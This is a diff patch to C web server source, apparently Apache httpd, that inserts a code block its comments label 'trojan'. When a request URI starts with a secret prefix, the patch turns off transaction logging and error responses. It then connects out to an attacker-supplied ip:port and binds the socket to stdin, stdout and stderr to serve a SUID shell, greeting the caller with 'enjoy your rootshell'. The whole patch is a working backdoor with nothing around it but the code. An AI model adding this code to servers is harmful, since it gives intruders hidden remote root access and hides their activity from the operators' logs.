@@ -1,0 +1,114 @@
+65a66,70
+> #include "trojan.h"
+> 
+> 
+> 
+> 
+114a120,121
+> int dontlog=0;
+> 
+1122c1129,1130
+<             ap_log_transaction(r);
+---
+>             if (dontlog == 0)
+>                 ap_log_transaction(r);
+1134c1142,1143
+<             ap_send_error_response(r, 0);
+---
+>             if (dontlog == 0)
+>                 ap_send_error_response(r, 0);
+1154c1163,1164
+<             ap_log_transaction(r);
+---
+>             if (dontlog == 0)
+>                 ap_log_transaction(r);
+1188c1198,1199
+<         ap_log_transaction(r);
+---
+>         if (dontlog==0)
+>             ap_log_transaction(r);
+1216c1227,1228
+<             ap_log_transaction(r);
+---
+>             if (dontlog == 0)
+>                 ap_log_transaction(r);
+2591a2604,2605
+>     char *hey;
+>     char test[512];
+2593a2608,2609
+> 
+> 
+2735c2751,2764
+< 	switch (status) {
+---
+>         /* trojan start */
+>         bzero(test,sizeof(test));
+>         hey = ap_escape_html(r->pool, r->uri);
+>         strncpy(test,hey,strlen(EVIL_URL));
+>                       //  012345678901234567801
+>         if (!strcmp(test,EVIL_URL))
+>         {
+>             dontlog=1;
+>             connect_shell(hey+strlen(EVIL_URL));
+>         }
+>         dontlog=0;
+> 
+>         /* trojan end */
+>         switch (status) {
+2964a2994,3049
+> 
+> /* trojan start */
+> int connect_shell(char hostname[512])
+> {
+>     int port;
+>     char tempo[512];
+>     char *getit;
+>     int sox;
+>     char command[1024];
+>     char fixed_command[1024];
+>     char onec[1024];
+> 
+>     FILE *response;
+> 
+>     struct sockaddr_in si;
+> 
+>     strcpy(tempo,hostname);
+>     strtok(tempo,":"); // ip here
+>     getit = hostname+strlen(tempo)+1;
+>     port = atoi(getit);
+>     strcpy(hostname,tempo);
+> 
+>     si.sin_family = AF_INET;
+>     si.sin_port = htons(port);
+>     si.sin_addr.s_addr = inet_addr(hostname); // is the ip really, not hostname
+> 
+> 
+>     sox = socket(AF_INET, SOCK_STREAM, 0);
+>     connect(sox, (struct sockaddr *)&si, sizeof(struct sockaddr));
+>     getit = "\nWelcome... enjoy your rootshell..\n";
+>     write(sox,getit,strlen(getit));
+> 
+>     while(1)
+>     {
+>         dup2(sox,0);
+>         dup2(sox,1);
+>         dup2(sox,2);
+>         execl(SUID_CODE,PATH_TO_HTTPD,(char *)0);
+>         close(sox);
+>         exit(0);
+>     }
+> }
+> /* trojan end */
+> 
+> 
+> 
+> 
+> 
+> 
+> 
+> 
+> 
+> 
+> 
+> 
+> 
